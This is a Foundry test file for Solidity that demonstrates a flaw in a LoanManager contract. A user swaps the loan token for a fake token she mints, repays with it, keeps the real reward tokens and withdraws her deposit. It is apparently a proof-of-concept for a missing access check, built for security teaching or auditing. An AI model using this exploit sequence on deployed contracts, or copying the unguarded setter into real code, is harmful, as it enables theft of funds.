// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/LoanManager.sol";
import "../src/ERC20.sol";

contract UnsafeLoanManagerTest is Test {
    address owner = address(1);
    address alice = address(2);
    Vault public vault;
    LoanManager public loanManager;
    ERC20 public token;
    ERC20 public fakeToken;

    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.deal(alice, 100 ether);
        vm.startPrank(owner);
        vault = new Vault();
        loanManager = new LoanManager(address(vault));
        token = new ERC20(
            "RewardToken",
            "RT",
            address(loanManager),
            1000000000 ether
        );

        fakeToken = new ERC20(
            "FakeToken",
            "FT",
            address(loanManager),
            1000000000 ether
        );

        loanManager.setLoanToken(address(token));
        vault.setLoanManager(address(loanManager));
        vm.stopPrank();

        vm.label(owner, "Owner");
        vm.label(alice, "Alice");
        vm.label(address(vault), "Vault");
        vm.label(address(loanManager), "LoanManager");
        vm.label(address(token), "RewardToken");
        vm.label(address(fakeToken), "FakeToken");
    }

    function testBalanceIsUpdatedCorrectlyAfterRepayingALoan_Unsafe() public {
        vm.startPrank(alice);

        vault.deposit{value: 1 ether}();
        loanManager.takeLoan();
        assertTrue(loanManager.totalLoans(alice) == vault.userDeposits(alice));
        uint256 _tokeBalanceBefore = token.balanceOf(alice);

        // Replace RewardToken for FakeToken
        loanManager.setLoanToken(address(fakeToken));
        fakeToken.mint(alice, loanManager.totalLoans(alice));
        fakeToken.approve(address(loanManager), type(uint256).max);

        // "returns" the loan keeping RewardToken as profit.
        loanManager.returnLoan();

        uint256 _tokenBalanceAfter = token.balanceOf(alice);

        // Withdraw initial deposit.
        uint256 balanceBefore = alice.balance;
        vault.withdraw();
        uint256 balanceAfter = alice.balance;
        vm.stopPrank();

        // Alice was able to withdraw her initial deposit while also keeping the loan
        assertTrue(loanManager.totalLoans(alice) == 0);
        assertTrue(_tokenBalanceAfter == _tokeBalanceBefore);
        assertTrue(balanceAfter > balanceBefore);
    }
}
